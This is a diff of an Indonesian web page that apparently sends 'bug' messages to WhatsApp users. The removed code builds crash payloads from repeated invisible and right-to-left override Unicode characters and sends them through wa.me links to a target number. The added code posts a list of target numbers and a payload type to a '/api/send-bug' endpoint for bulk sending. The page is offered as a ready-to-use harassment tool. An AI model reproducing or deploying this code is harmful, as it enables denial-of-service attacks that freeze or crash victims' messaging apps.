@@ -1,63 +1,68 @@
-<!DOCTYPE html>
-<html lang="id">
+<!DOCTYPE html><html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <title>BUG WA AUTO-ADD</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Zionixszy</title>
   <style>
     body {
-      background-color: #121212;
-      color: #fff;
-      font-family: Arial, sans-serif;
-      text-align: center;
-      padding: 40px;
+      background-color: #111;
+      color: white;
+      font-family: sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 2rem;
     }
-    input, select, button {
-      padding: 12px;
-      margin: 10px;
-      border-radius: 10px;
-      font-size: 18px;
+    textarea, select, button {
+      padding: 1rem;
+      margin: 0.5rem 0;
+      border-radius: 8px;
       border: none;
-      width: 80%;
+      width: 90%;
       max-width: 400px;
+      font-size: 1rem;
     }
     button {
-      background: #25D366;
+      background-color: #25D366;
       color: white;
-      font-weight: bold;
       cursor: pointer;
+      font-weight: bold;
     }
   </style>
 </head>
 <body>
-  <h2>💥 EXSZYY CRASH💋</h2>
-  <input id="6288212464391" placeholder="Contoh: 6288212464391"><br>
-  <select id="nomor">
-    <option value="blank">Blank Bug</option>
+  <h1>🧨 Kirim Bug WhatsApp</h1>
+  <textarea id="nomor" rows="6" placeholder="Daftar nomor target, pisahkan dengan ENTER (contoh: 6281234567890)"></textarea>
+  <select id="jenis">
     <option value="ui">UI Delay</option>
+    <option value="blank">Blank</option>
     <option value="crash">Crash Ringan</option>
-  </select><br>
-  <button onclick="kirim()">KIRIM SEKARANG</button>
+  </select>
+  <button onclick="kirim()">KIRIM</button>  <script>
+    async function kirim() {
+      const raw = document.getElementById("nomor").value.trim();
+      const list = raw.split(/\s+/).filter(n => n.startsWith("62"));
+      const jenis = document.getElementById("jenis").value;
 
-  <script>
-    function getBug(jenis) {
-      if (jenis === "blank") return "\u2063".repeat(999999999999999999);
-      if (jenis === "ui") return "\u200F\u202E\u2063\u3164".repeat(9999999999);
-      if (jenis === "crash") return "\u202E".repeat(1500) + "🔒".repeat(500);
-    }
-
-    function kirim() {
-      let nomor = document.getElementById("nomor").value.trim();
-      let jenis = document.getElementById("jenis").value;
-
-      if (!nomor.startsWith("62")) {
-        alert("Gunakan nomor awalan 62 (Indonesia)");
+      if (list.length === 0) {
+        alert("Masukkan minimal 1 nomor yang diawali 62");
         return;
       }
 
-      let bug = encodeURIComponent(getBug(jenis));
-      let waUrl = `https://wa.me/${nomor}?text=${bug}`;
-      window.open(waUrl, "_blank");
+      try {
+        const res = await fetch("/api/send-bug", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ list, jenis }),
+        });
+
+        const json = await res.json();
+        alert(json.status || "Berhasil dikirim!");
+      } catch (err) {
+        alert("Gagal mengirim: " + err.message);
+      }
     }
-  </script>
-</body>
+  </script></body>
 </html>
